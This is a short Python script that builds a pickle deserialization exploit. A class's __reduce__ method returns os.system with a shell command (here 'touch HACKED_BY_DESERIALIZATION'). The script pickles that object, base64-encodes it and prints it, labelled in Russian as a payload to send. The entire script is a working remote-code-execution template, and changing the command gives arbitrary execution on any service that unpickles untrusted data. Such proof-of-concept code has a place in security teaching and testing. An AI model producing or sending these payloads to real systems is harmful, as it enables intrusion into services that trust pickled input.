import pickle
import base64
import os

class RCE:
    def __reduce__(self):
        return (os.system, ('touch HACKED_BY_DESERIALIZATION',))

payload = pickle.dumps(RCE())

b64_payload = base64.b64encode(payload)
print("Payload для отправки:", b64_payload.decode())